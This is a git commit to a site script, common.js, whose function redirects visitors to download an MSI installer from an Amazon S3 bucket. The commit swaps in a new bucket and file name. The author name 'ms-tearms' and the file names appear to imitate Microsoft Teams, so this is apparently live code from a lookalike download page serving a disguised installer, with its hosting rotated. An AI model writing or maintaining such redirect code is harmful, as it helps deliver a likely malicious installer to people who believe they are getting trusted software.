1123fea1c9747a4971d2fb32b291104b533e1256
ms-tearms <mjdkdkkdtyjejjdimonika7@gmail.com>
2025-06-05 11:41:25 +0800

    Update common.js

--- common.js
+++ common.js
@@ -1,5 +1,5 @@
 function GetToFunction()
 {
-	var url="https://gg0602.s3.ap-southeast-1.amazonaws.com/MSTMS_x64.msi";
+	var url="https://gg604.s3.ap-southeast-1.amazonaws.com/MSTm_x64.msi";
 	window.location=url;
 }
